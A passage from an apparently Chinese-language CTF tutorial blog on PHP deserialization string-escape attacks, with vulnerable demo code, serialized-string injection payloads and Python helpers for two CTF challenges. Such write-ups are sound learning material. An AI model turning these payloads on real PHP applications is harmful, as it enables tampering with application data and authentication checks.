</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1># show_source(__FILE__);
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>filter</span><span class=p>(</span><span class=nv>$str</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;bb&#39;</span><span class=p>,</span> <span class=s1>&#39;ccc&#39;</span><span class=p>,</span> <span class=nv>$str</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>A</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s1>&#39;bao&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$pass</span><span class=o>=</span><span class=s1>&#39;123456&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$AA</span><span class=o>=</span><span class=k>new</span> <span class=nx>A</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$AA</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span><span class=o>=</span><span class=nx>filter</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$AA</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$res</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$res</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$c</span><span class=o>-&gt;</span><span class=na>pass</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>然后我们测试一下怎么才能够逃逸</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1># show_source(__FILE__);
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>filter</span><span class=p>(</span><span class=nv>$str</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;bb&#39;</span><span class=p>,</span> <span class=s1>&#39;ccc&#39;</span><span class=p>,</span> <span class=nv>$str</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>A</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s1>&#39;baobb&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$pass</span><span class=o>=</span><span class=s1>&#39;123456&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$AA</span><span class=o>=</span><span class=k>new</span> <span class=nx>A</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$AA</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span><span class=o>=</span><span class=nx>filter</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$AA</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$res</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$res</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$c</span><span class=o>-&gt;</span><span class=na>pass</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;A&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;baobb&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;pass&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;123456&#34;</span><span class=p>;}</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>1</span><span class=o>:</span><span class=s2>&#34;A&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;name&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;baoccc&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;pass&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>6</span><span class=o>:</span><span class=s2>&#34;123456&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><p>可以看到是能够多一个字符那么我们正常的写出<code>payload</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#34;;s:4:&#34;pass&#34;;s:8:&#34;baozongwi&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>写个EXP</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=s1>&#39;&#34;;s:4:&#34;pass&#34;;s:9:&#34;baozongwi&#34;;}&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;bb&#39;</span><span class=o>*</span><span class=mi>30</span><span class=o>+</span><span class=s1>&#39;&#34;;s:4:&#34;pass&#34;;s:9:&#34;baozongwi&#34;;}&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=c1># show_source(__FILE__);
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>function</span> <span class=nf>filter</span><span class=p>(</span><span class=nv>$str</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;bb&#39;</span><span class=p>,</span> <span class=s1>&#39;ccc&#39;</span><span class=p>,</span> <span class=nv>$str</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>A</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=o>=</span><span class=s1>&#39;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&#34;;s:4:&#34;pass&#34;;s:9:&#34;baozongwi&#34;;}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$pass</span><span class=o>=</span><span class=s1>&#39;123456&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$AA</span><span class=o>=</span><span class=k>new</span> <span class=nx>A</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$AA</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span><span class=o>=</span><span class=nx>filter</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$AA</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$res</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$res</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$c</span><span class=o>-&gt;</span><span class=na>pass</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>打入成功</p><p>这里的规律就是</p><blockquote><p>原字符长度(这里就是所有bb的长度)+打入的payload长度=过滤后的长度(所有ccc的长度)</p></blockquote><p>Demo：<strong>ctfshow月饼杯web1_此夜圆</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>a</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$uname</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$password</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$uname</span><span class=p>,</span><span class=nv>$password</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>uname</span><span class=o>=</span><span class=nv>$uname</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>=</span><span class=nv>$password</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>===</span><span class=s1>&#39;yu22x&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=k>include</span><span class=p>(</span><span class=s1>&#39;flag.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>	
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>			<span class=k>else</span>
</span></span><span class=line><span class=cl>			<span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=k>echo</span> <span class=s1>&#39;wrong password&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>filter</span><span class=p>(</span><span class=nv>$string</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;Firebasky&#39;</span><span class=p>,</span><span class=s1>&#39;Firebaskyup&#39;</span><span class=p>,</span><span class=nv>$string</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$uname</span><span class=o>=</span><span class=nv>$_GET</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$password</span><span class=o>=</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$ser</span><span class=o>=</span><span class=nx>filter</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>a</span><span class=p>(</span><span class=nv>$uname</span><span class=p>,</span><span class=nv>$password</span><span class=p>)));</span>
</span></span><span class=line><span class=cl><span class=nv>$test</span><span class=o>=</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$ser</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>这里要使得<code>password</code>等于<code>yu22x</code></p><p>写出payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#34;;s:8:&#34;password&#34;;s:5:&#34;yu22x&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>exp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=s1>&#39;&#34;;s:8:&#34;password&#34;;s:5:&#34;yu22x&#34;;}&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=mi>15</span><span class=o>*</span><span class=s2>&#34;Firebasky&#34;</span><span class=o>+</span><span class=s1>&#39;&#34;;s:8:&#34;password&#34;;s:5:&#34;yu22x&#34;;}&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>直接打入即可,这里的代码可能有师傅会晕，也讲讲，为啥有个<code>serialize</code>呢</p><p>不要忘了我们刚才逃逸字符的过程也是<code>serialize</code>才逃逸出来的</p><h3 id=字符减少>字符减少</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>str_rep</span><span class=p>(</span><span class=nv>$string</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>preg_replace</span><span class=p>(</span> <span class=s1>&#39;/php|test/&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=nv>$string</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$test</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$test</span><span class=p>[</span><span class=s1>&#39;sign&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;sign&#39;</span><span class=p>];</span> 
</span></span><span class=line><span class=cl><span class=nv>$test</span><span class=p>[</span><span class=s1>&#39;number&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;2020&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$temp</span> <span class=o>=</span> <span class=nx>str_rep</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$test</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>printf</span><span class=p>(</span><span class=nv>$temp</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$fake</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$temp</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s1>&#39;&lt;br&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>print</span><span class=p>(</span><span class=s2>&#34;name:&#34;</span><span class=o>.</span><span class=nv>$fake</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;&lt;br&gt;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>print</span><span class=p>(</span><span class=s2>&#34;sign:&#34;</span><span class=o>.</span><span class=nv>$fake</span><span class=p>[</span><span class=s1>&#39;sign&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;&lt;br&gt;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>print</span><span class=p>(</span><span class=s2>&#34;number:&#34;</span><span class=o>.</span><span class=nv>$fake</span><span class=p>[</span><span class=s1>&#39;number&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;&lt;br&gt;&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>我们的目标就是修改number的值，先写<code>payload</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#34;;s:6:&#34;number&#34;;s:4:&#34;2024&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>这里测试,首先都会被置换为空，那么我们写php就能逃逸3个字符，写test就能逃逸4个字符</p><p>那么这里有个小点子就是序列化的进程</p><p>当序列化遇到空值时，序列化并不会停止而是继续识别，然后将那一部分当做值</p><p><img src=/p/php-deserialization-pop/QQ20240908-201109.png width=1467 height=753 srcset="/p/php-deserialization-pop/QQ20240908-201109_hu_c666b2efd8f1b050.png 480w, /p/php-deserialization-pop/QQ20240908-201109_hu_d93376e99f0f48a8.png 1024w" loading=lazy alt=5 class=gallery-image data-flex-grow=194 data-flex-basis=467px></p><p>如图，我选中的部分就被当成了<code>name</code>的值</p><p>而后我们补上的sign就是可控的了，想怎么来就怎么来</p><p>只要相应的将前面的逃逸字符能够对上就够了</p><p>我们先构造出逃逸字符后面的payload，这里直接选中即可</p><p><img src=/p/php-deserialization-pop/QQ20240908-201741.png width=1017 height=783 srcset="/p/php-deserialization-pop/QQ20240908-201741_hu_20f5726882425dda.png 480w, /p/php-deserialization-pop/QQ20240908-201741_hu_3d0f20a3ec46d8b5.png 1024w" loading=lazy alt=6 class=gallery-image data-flex-grow=129 data-flex-basis=311px></p><p>补上之后，选中逃逸字符将要选中的字符计算长度</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=s1>&#39;&#34;;s:4:&#34;sign&#34;;s:45:&#34;&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=mi>1</span><span class=o>*</span><span class=s2>&#34;php&#34;</span><span class=o>+</span><span class=s2>&#34;test&#34;</span><span class=o>*</span><span class=mi>4</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>那么成功打入啦</p><p>Demo:<strong>[安洵杯 2019]easy_serialize_php</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$function</span> <span class=o>=</span> <span class=o>@</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;f&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>filter</span><span class=p>(</span><span class=nv>$img</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filter_arr</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;php&#39;</span><span class=p>,</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span><span class=s1>&#39;php5&#39;</span><span class=p>,</span><span class=s1>&#39;php4&#39;</span><span class=p>,</span><span class=s1>&#39;fl1g&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filter</span> <span class=o>=</span> <span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nx>implode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>,</span><span class=nv>$filter_arr</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;/i&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=nv>$filter</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$img</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nx>unset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$_SESSION</span><span class=p>[</span><span class=s2>&#34;user&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;guest&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;function&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$function</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>extract</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nv>$function</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s1>&#39;&lt;a href=&#34;index.php?f=highlight_file&#34;&gt;source_code&lt;/a&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;img_path&#39;</span><span class=p>]){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;img&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=s1>&#39;guest_img.png&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;img&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>sha1</span><span class=p>(</span><span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;img_path&#39;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$serialize_info</span> <span class=o>=</span> <span class=nx>filter</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$function</span> <span class=o>==</span> <span class=s1>&#39;highlight_file&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=s1>&#39;index.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span> <span class=k>if</span><span class=p>(</span><span class=nv>$function</span> <span class=o>==</span> <span class=s1>&#39;phpinfo&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>eval</span><span class=p>(</span><span class=s1>&#39;phpinfo();&#39;</span><span class=p>);</span> <span class=c1>//maybe you can find something in here!
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span><span class=k>else</span> <span class=k>if</span><span class=p>(</span><span class=nv>$function</span> <span class=o>==</span> <span class=s1>&#39;show_image&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$userinfo</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$serialize_info</span><span class=p>);</span>
